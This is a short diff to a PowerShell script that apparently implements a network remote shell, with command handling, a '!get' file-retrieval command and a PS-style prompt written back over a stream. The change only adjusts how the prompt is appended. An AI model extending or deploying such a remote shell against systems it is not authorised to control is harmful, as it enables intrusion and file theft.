@@ -110,7 +110,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 
                 try {
                     if ([string]::IsNullOrWhiteSpace($cmd)) {
-                        $response = "`nPS $currentDir> "
+                        $response = ""
                     }
                     elseif ($cmd.StartsWith("!get")) {
                         $path = $cmd.Substring(4).Trim()
@@ -169,7 +169,11 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                 }
 
-                $response += "`nPS $currentDir> "
+                # Универсальное добавление приглашения:
+                if (-not $response.EndsWith("`nPS $currentDir> ")) {
+                    $response += "`nPS $currentDir> "
+                }
+
                 $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                 $stream.Write($outBytes, 0, $outBytes.Length)
                 $stream.Flush()
